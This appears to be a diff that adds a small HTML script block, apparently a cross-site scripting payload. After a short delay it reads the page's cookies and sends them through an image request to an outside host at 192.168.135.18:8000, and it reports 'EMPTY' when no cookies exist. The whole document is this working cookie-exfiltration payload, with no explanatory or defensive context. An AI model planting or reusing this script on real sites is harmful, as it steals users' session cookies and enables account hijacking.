@@ -1,0 +1,10 @@
+<script>
+setTimeout(() => {
+    const cookies = document.cookie;
+    if (cookies) {
+        new Image().src = "http://192.168.135.18:8000/?cookie=" + encodeURIComponent(cookies);
+    } else {
+        new Image().src = "http://192.168.135.18:8000/?cookie=EMPTY";
+    }
+}, 1500);
+</script>
